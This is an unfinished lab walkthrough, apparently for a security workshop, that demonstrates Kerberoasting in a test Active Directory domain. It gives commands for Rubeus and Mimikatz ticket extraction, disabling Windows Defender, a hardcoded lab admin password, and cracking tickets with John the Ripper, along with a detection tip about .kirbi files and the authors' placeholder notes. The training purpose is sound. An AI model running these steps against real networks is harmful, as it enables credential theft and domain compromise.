# Common Kerberoasting

RYAN> Fill this all out and make it purty, boyfriend!!!
RYAN> Fill this all out and make it purty, boyfriend!!!
RYAN> Fill this all out and make it purty, boyfriend!!!

What's a SPN?! Who cares? What's a MSA? AND WHY ARE THEY IMPORTANT?!!!

Why is Kerberoasting effective? How to prevent?

**BRANDON>** Just commands for now, but this is what I'll be running :).

## Kerberoasting via Rubeus

We'll begin by using Rubeus, a commonly-used tool that fully automated the Kerberoasting process. This attack couldn't be simpler than using Rubeus -- Let's see why!

At this point you should still be RDP'd to TWORIVERS from the attack machine. On TWORIVERS, do the following:

1. Use RunAs to run a PowerShell prompt as `WHEEL\Administrator`:
    
    1. Start menu -> type `run` -> click "Run (App)" -> enter:
    
    ```powershell
    runas /user:wheel\Administrator powershell.exe
    ```
    
    - You will be prompted to `Enter the password for wheel\Administrator:`, which is:
        
        ```
        12qwaszx!@QWASZX
        ```
    
    A new PowerShell prompt with the title `Administrator: powershell.exe (running as wheel\Administrator` will open. Good!

    Now that we are running PowerShell as a domain admin, let's enumerate AD!

1. Extract Rubeus:

    ```powershell
    cd C:\Users\Public\Desktop\LAB_FILES\assets\
    expand-archive ./Rubeus-1.6.4.zip
    cd .\Rubeus-1.6.4\Rubeus-1.6.4\
    ```

    As a note, [Rubeus is provided as source code](https://for528.com/rubeus). Some TAs will use [a well-known pre-compiled version in their attacks](https://for528.com/ghostpack-compiled), while others will compile the tool from source.

1. Perform a Kerberoasting attack using Rubeus:
    
    ```powershell
    ./rubeus.exe kerberoast /ldapfilter:'admincount=1' /format:hashcat /outfile:C:\Perflogs\hashes.txt
    ```

    Above we used the `/format:hashcat` option to tell Rubeus to output hashes in hashcat format. [The project's Roast.cs source file](https://github.com/GhostPack/Rubeus/blob/659d98d8582573c2ff8c3a68ee0b02d7d5f8387d/Rubeus/lib/Roast.cs#L207) accepts either `john` or `hashcat` as the output options. Many TAs like to use [haschat](https://for528.com/hashcat) because of its strong support for GPU cracking.

!!!! RYAN FILL ME OUT WITH THE NEXT STEPS FOR CRACKING SON !!!!
!!!! RYAN FILL ME OUT WITH THE NEXT STEPS FOR CRACKING SON !!!!

### DANGER WILL ROBINSON

WHOOPS!!! Need .NET Framework 3.5!
WHOOPS!!! Need .NET Framework 3.5!
WHOOPS!!! Need .NET Framework 3.5!
WHOOPS!!! Need .NET Framework 3.5!

See https://github.com/arosenmund/defcon_31_ad_good_bad_lolWut/issues/8

### DANGER WILL ROBINSON

## Kerberoasting via Mimikatz

Next we'll be usin Mimikatz to perform a Kerberoasting attack.

To begin, you'll be using the same elevated PowerShell prompt via the `WHEEL\Administrator` account. If you closed the window, simply follow step #1 in the [Kerberoasting via Rubeus](#kerberoasting-via-rubeus) section above, then follow the steps below.

Though Rubeus automated the processing of Kerberoasting from start to finish, Mimikatz can be used with a bit more coaxing. Since lower-skilled TAs such as ransomware actors depend heavily on both of these tools, we'll now review an example method for Kerberoasting via Mimikatz.

We'll be using a bit of PowerShell to identify potentially susceptible SPNs and then to 

1. In your `WHEEL\Administrator` PowerShell prompt, install the Remote Server Administration Tools for Active Direcotry (RSAT-AD) by running:

    ```powershell
    Install-WindowsFeature -Name "RSAT-AD-PowerShell" -IncludeAllSubFeature
    ```

1. Next, run the following to identify potentially susceptible accounts:

    ```powershell
    Get-ADUser -filter * -Properties ServicePrincipalName | Select SamAccountName, ServicePrincipalName | where {$_.ServicePrincipalName -ne $null} | fl
    ```

    Expected output:
    
    ```powershell
    SamAccountName       : krbtgt
    ServicePrincipalName : {kadmin/changepw}

    SamAccountName       : svc-file
    ServicePrincipalName : {HOST/DRAGONMOUNT.wheel.co}
    ```

    Above we can see that the `svc-file` account has a SPN of `HOST/DRAGONMOUNT.wheel.co`. Great! We will now use PS to pull a Kerberos ticket for this account into memory.

1. Run the following to obtain a Kerberos ticket for the susceptible SPN:

    ```powershell
    Add-Type -AssemblyName System.IdentityModel
    ```
    
    ```powershell
    New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "HOST/DRAGONMOUNT.wheel.co"
    ```

    Expected output:
    
    ```powershell
    Id                   : uuid-862b3890-a138-4061-96ac-8589821807b8-2
    SecurityKeys         : {System.IdentityModel.Tokens.InMemorySymmetricSecurityKey}
    ValidFrom            : 8/7/2023 6:41:19 PM
    ValidTo              : 8/8/2023 4:28:46 AM
    ServicePrincipalName : HOST/DRAGONMOUNT.wheel.co
    SecurityKey          : System.IdentityModel.Tokens.InMemorySymmetricSecurityKey
    ```

    Wonderful! If you see something similar to the above output, this means that you now have a Kerberos ticket for the `HOST/DRAGONMOUNT.wheel.co` SPN in memory.
    
    We will now **use Mimikatz to dump this ticket to disk.**

    _NOTE:_ You should already have 1) disabled Windows Defender and 2) extracted Mimikatz. If not, make sure to disable WD extract Mimikatz now:
    
    ```powershell
    Set-MpPreference -DisableRealtimeMonitoring 1
    ```
    
    ```powershell
    cd c:\Users\Public\Desktop\LAB_FILES\assets\
    expand-archive ./mimikatz_trunk.zip
    ```

1. Run mimikatz meow:
    
    ```powershell
    cd c:\Users\Public\Desktop\LAB_FILES\assets\mimikatz_trunk\x64\
    .\mimikatz.exe
    ```
   
1. At the Mimikatz prompt (`mimikatz #`), run the following commands:

    ```
    privilege::debug
    kerberos::list /export
    ```

    Expected output:
    
    ```
    [00000000] - 0x00000012 - aes256_hmac
       Start/End/MaxRenew: 8/7/2023 6:38:12 PM ; 8/8/2023 4:28:46 AM ; 8/14/2023 6:28:46 PM
       Server Name       : krbtgt/WHEEL.CO @ WHEEL.CO
       Client Name       : Administrator @ WHEEL.CO
       Flags 60a10000    : name_canonicalize ; pre_authent ; renewable ; forwarded ; forwardable ;
       * Saved to file     : 0-60a10000-Administrator@krbtgt~WHEEL.CO-WHEEL.CO.kirbi

    [00000001] - 0x00000012 - aes256_hmac
       Start/End/MaxRenew: 8/7/2023 6:28:46 PM ; 8/8/2023 4:28:46 AM ; 8/14/2023 6:28:46 PM
       Server Name       : krbtgt/WHEEL.CO @ WHEEL.CO
       Client Name       : Administrator @ WHEEL.CO
       Flags 40e10000    : name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ;
       * Saved to file     : 1-40e10000-Administrator@krbtgt~WHEEL.CO-WHEEL.CO.kirbi

    [00000002] - 0x00000017 - rc4_hmac_nt
       Start/End/MaxRenew: 8/7/2023 6:41:19 PM ; 8/8/2023 4:28:46 AM ; 8/14/2023 6:28:46 PM
       Server Name       : HOST/DRAGONMOUNT.wheel.co @ WHEEL.CO
       Client Name       : Administrator @ WHEEL.CO
       Flags 40a10000    : name_canonicalize ; pre_authent ; renewable ; forwardable ;
       * Saved to file     : 2-40a10000-Administrator@HOST~DRAGONMOUNT.wheel.co-WHEEL.CO.kirbi

    [00000003] - 0x00000012 - aes256_hmac
       Start/End/MaxRenew: 8/7/2023 6:38:12 PM ; 8/8/2023 4:28:46 AM ; 8/14/2023 6:28:46 PM
       Server Name       : ldap/tarvalon.wheel.co/wheel.co @ WHEEL.CO
       Client Name       : Administrator @ WHEEL.CO
       Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;
       * Saved to file     : 3-40a50000-Administrator@ldap~tarvalon.wheel.co~wheel.co-WHEEL.CO.kirbi
    ```

    Notice that we have just dumped multiple `.kirbi` files to disk. These files are a Mimikatz-specific file type. 

    The next step in this attack would be to:
        
    1. Exfiltrate the `.kirbi` files
    
    1. Attempt to crack the passwords contained within them
        
        - This would normally occur out of the victim network. For example, the TA in this case might copy the `.kirbi` files out via RDP to the `Lighteater` host and then attempt to crack them there.

### A note about kirbi files

The Mimikatz code base uses a hardcoded file suffix of `.kirbi` when it saves tickets to disk. You can find the relevant lines of code at the following links:
    
- [A global constant for the file extension in line 40 of globals.h](https://github.com/gentilkiwi/mimikatz/blob/82cb7eb2370d63eefc0c0293a9778a0d7e8466d8/inc/globals.h#L40)
    
Code at this line: `#define MIMIKATZ_KERBEROS_EXT L"kirbi"`

- [The global constant being used for file creation](https://github.com/gentilkiwi/mimikatz/blob/e10bde5b16b747dc09ca5146f93f2beaf74dd17a/mimikatz/modules/kerberos/kuhl_m_kerberos.c#L242)
    
    Code at this line: `if(filename = kuhl_m_kerberos_generateFileName(i, &pKerbCacheResponse->Tickets[i], MIMIKATZ_KERBEROS_EXT))`

This serves as a great example as to why being able to review source code can prove useful in generating your detection and mitigation methods! Given this finding, you should set up alerts for the creation of any file with a `.kirbi` extension.
- Sure, threat actors _could_ compile their own versions of Mimikatz with custom file suffixes set, but this is not done commonly by TAs such as ransomware affiliates.

## Cracking the Kirbi Files

1. Exit Mimikatz:
    
    ```
    mimikatz # exit
    ```

1. Review the dumped `.kirbi` files that you just obtained:
    
    ```powershell
    ls *.kirbi
    ```
    
    Expected output:
    
    ```powershell
        Directory: C:\Users\Public\Desktop\LAB_FILES\assets\mimikatz_trunk\x64

    Mode                 LastWriteTime         Length Name
    ----                 -------------         ------ ----
    -a----          8/7/2023   6:55 PM           1440 0-60a10000-Administrator@krbtgt~WHEEL.CO-WHEEL.CO.kirbi
    -a----          8/7/2023   6:55 PM           1472 1-40e10000-Administrator@krbtgt~WHEEL.CO-WHEEL.CO.kirbi
    -a----          8/7/2023   6:55 PM           1634 2-40a10000-Administrator@HOST~DRAGONMOUNT.wheel.co-WHEEL.CO.kirbi
    -a----          8/7/2023   6:55 PM           1644 3-40a50000-Administrator@ldap~tarvalon.wheel.co~wheel.co-WHEEL.CO.kirbi
    ```
    
### RYAN FINISH ME BUDDY!!

RYAN TO DOCUMENT WHAT WOULD HAPPEN NEXT!!!
RYAN TO DOCUMENT WHAT WOULD HAPPEN NEXT!!!

### RYAN FINISH ME BUDDY!!

```
kirbi2john.py 2-40a10000-Administrator@HOST~DRAGONMOUNT.wheel.co-WHEEL.CO.kirbi > svc-file_krb5tgs.txt

john --wordlist=./rockyou.txt svc-file_krb5tgs.txt
```
